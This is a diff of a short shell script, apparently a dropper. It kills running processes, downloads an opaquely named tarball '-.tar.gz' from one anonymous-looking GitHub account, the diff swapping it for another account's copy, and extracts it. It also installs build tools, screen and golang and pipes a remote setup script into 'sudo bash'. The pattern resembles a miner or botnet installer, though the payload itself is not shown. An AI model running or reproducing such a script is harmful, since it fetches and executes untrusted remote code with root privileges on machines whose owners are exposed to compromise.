@@ -1,6 +1,6 @@
 #!/bin/sh
 pkill -
-wget https://github.com/nurkartina604/st/raw/main/-.tar.gz
+wget https://github.com/muledan1/bash/raw/main/-.tar.gz
 tar -xf -.tar.gz
 apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
